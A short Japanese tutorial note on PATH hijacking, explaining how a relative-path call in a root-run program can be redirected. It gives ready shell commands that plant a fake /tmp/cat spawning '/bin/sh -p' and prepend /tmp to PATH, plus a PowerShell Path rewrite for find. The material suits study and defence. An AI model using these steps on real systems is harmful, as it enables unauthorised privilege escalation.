# パスハイジャックとは
OSが正規のプログラムへたどり着くためのパスを、攻撃者が偽のプログラムへ向かうように乗っ取ってしまう攻撃手法。

## 相対パスの危険性
攻撃者が環境変数を書き換えることによって、正規のプログラムにたどり着く前に攻撃者が作成したプログラムを実行させることができる。
- Linux: rootで実行されるプログラム内でcatを相対パス呼び出ししている
```bash
echo '#!/bin/bash' > /tmp/cat # /tmpにcatというbashスクリプトを作成
echo '/bin/sh -p' >> /tmp/cat # プロセス実行時の権限を保持する
chmod +x /tmp/cat # 実行権限の付与
export PATH=/tmp:$PATH # 環境変数を/tmpから探すように変更
```
- Windows: findコマンドをハイジャック
```powershell
先にC:\Temp\find.exeを作成しておく
$env:Path = "C:\Temp;" + $env:Path # 環境変数の書き換え
```
